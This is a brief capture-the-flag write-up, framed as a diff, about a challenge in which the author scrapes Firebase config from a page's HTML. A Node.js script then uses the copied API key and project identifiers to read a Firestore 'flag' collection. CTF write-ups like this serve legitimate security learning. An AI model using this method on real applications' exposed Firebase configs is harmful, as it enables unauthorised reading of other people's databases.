@@ -1,0 +1,40 @@
+So it was a Nice challange Steps :
+
+1)When I was inspecting the html, I notice that there are firebase configs
+2)So the goal was to connect to the firebase instance as the challenge name suggested .Collection
+3)The collection name could be guessed. I was using firebase version > 9 .
+4) I used This script :
+###~import firebase from "firebase/compat/app";
+import 'firebase/compat/firestore';
+
+const firebaseConfig = {
+    apiKey: 'AIzaSyDymZ5rLs40BKuNLqVBr0Uj6rKq1DW5tQ4',
+    authDomain: 'vishwa-challenge-12.firebaseapp.com',
+    projectId: 'vishwa-challenge-12',
+    storageBucket: 'vishwa-challenge-12.appspot.com',
+    messagingSenderId: '665976141772',
+    appId: '1:665976141772:web:b45c858837d7d2066d0f69',
+};
+
+const app = firebase.initializeApp(firebaseConfig);
+const firestore = firebase.firestore(app);
+
+(async () => {
+  try {
+
+    // get the first two docs
+    const snapshot = await firestore.collection('flag').limit(2).get()
+    // get the data from the docs
+    snapshot.docs.forEach(doc => console.log(doc.data()));
+    // exit 
+    process.exit(0)
+  } catch (error) {
+    console.log(error);
+  }
+})();~###
+
+5)And I got the flag :
+
+:)
+
+###Made By Shriyansh Gupta (Dumbledore's Army)###
